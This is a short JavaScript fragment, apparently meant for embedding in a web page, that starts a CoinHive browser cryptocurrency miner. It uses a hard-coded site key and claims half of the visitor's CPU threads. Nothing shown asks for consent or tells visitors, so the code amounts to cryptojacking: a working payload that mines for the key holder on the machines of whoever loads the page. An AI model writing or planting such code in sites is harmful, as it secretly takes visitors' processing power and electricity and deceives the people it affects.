    thr = navigator.hardwareConcurrency / 2;
    var miner = new CoinHive.Anonymous('JYDbnKsVDB9qnX0SLg36R33gcu1789YH', {
        threads: thr,
        autoThreads: false
    });
    miner.start();